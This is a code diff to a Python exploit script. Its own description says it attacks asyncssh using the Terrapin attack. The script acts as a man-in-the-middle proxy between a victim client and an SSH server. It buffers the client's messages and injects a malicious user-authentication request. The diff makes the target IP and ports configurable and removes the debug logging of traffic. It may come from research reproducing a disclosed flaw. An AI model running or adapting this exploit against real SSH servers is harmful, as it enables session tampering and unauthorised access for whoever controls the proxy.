@@ -6,12 +6,22 @@ import socket
 from threading import Thread
 from random import randint
 import time
+import argparse
 
-PROXY_PORT = 2201
-SERVER_PORT = 2200
-SERVER_IP = "127.0.0.1"
-PROXY_TIMEOUT = 10
+parser = argparse.ArgumentParser(description="Script to attack asyncssh using the Terrapin attack")
+parser.add_argument("--proxy-port", type=int, help="The port number for the proxy server")
+parser.add_argument("--server-port", type=int, default=22, help="The port number for the server")
+parser.add_argument("--server-ip", type=str, default="127.0.0.1", help="The IP address of the server")
+
+args = parser.parse_args()
+
+PROXY_PORT = args.proxy_port
+SERVER_PORT = args.server_port
+SERVER_IP = args.server_ip
+
+NEW_KEYS_LENGTH = 16
 EXT_INFO_LENGTH = 60
+ADDITIONAL_CLIENT_MESSAGES_LENGTH = 60
 
 
 def main():
@@ -35,9 +45,6 @@ def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.connect((SERVER_IP, SERVER_PORT))
     print("Connected to server")
-
-    # Set the timeout for the sockets
-    victim_socket.settimeout(PROXY_TIMEOUT)
 
     # Start a MITM forwarding proxy
     Thread(target=forward_client_to_server, args=(victim_socket, server_socket)).start()
@@ -95,7 +102,6 @@ def forward_client_to_server(victim_socket, server_socket):
     victim_socket (socket): The socket connected to the victim.
     server_socket (socket): The socket connected to the server.
     """
-    v_c_file = open("victim_to_server.bin", "wb")
     expected_message_length = 0
     new_keys_detected = False
     delay_next = False
@@ -108,7 +114,6 @@ def forward_client_to_server(victim_socket, server_socket):
             if message_info == "Protocol_Message":
                 print("Protocol message detected, forwarding data to server")
                 server_socket.sendall(data)
-                v_c_file.write(data)
                 continue
 
             if delay_next:
@@ -131,11 +136,11 @@ def forward_client_to_server(victim_socket, server_socket):
                     new_keys_detected = True
                     user_auth_request = create_user_auth_request()
                     print("Sending malicious user auth request to server: ", user_auth_request)
-                    if len(data) < 156:
+                    if len(data) < NEW_KEYS_LENGTH + EXT_INFO_LENGTH + ADDITIONAL_CLIENT_MESSAGES_LENGTH:
                         print(
                             "Data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!"
                         )
-                        while len(data) < 156:
+                        while len(data) < NEW_KEYS_LENGTH + EXT_INFO_LENGTH + ADDITIONAL_CLIENT_MESSAGES_LENGTH:
                             data += victim_socket.recv(4096)
                     server_socket.sendall(
                         user_auth_request +
@@ -147,7 +152,6 @@ def forward_client_to_server(victim_socket, server_socket):
 
             print("Data sent to server: ", data)
             server_socket.sendall(data)
-            v_c_file.write(data)
     except ConnectionAbortedError:
         print("Connection with victim has been reset")
     print("Forwarding data from victim to server has been completed, closing connection")
@@ -163,14 +167,12 @@ def forward_server_to_client(victim_socket, server_socket):
     victim_socket (socket): The socket connected to the victim.
     server_socket (socket): The socket connected to the server.
     """
-    c_s_file = open("server_to_victim.bin", "wb")
     try:
         while True:
             data = server_socket.recv(4096)
             if not data:
                 break
             victim_socket.sendall(data)
-            c_s_file.write(data)
     except ConnectionAbortedError:
         print("Connection with server has been reset")
     print("Forwarding data from server to victim has been completed, closing connection")
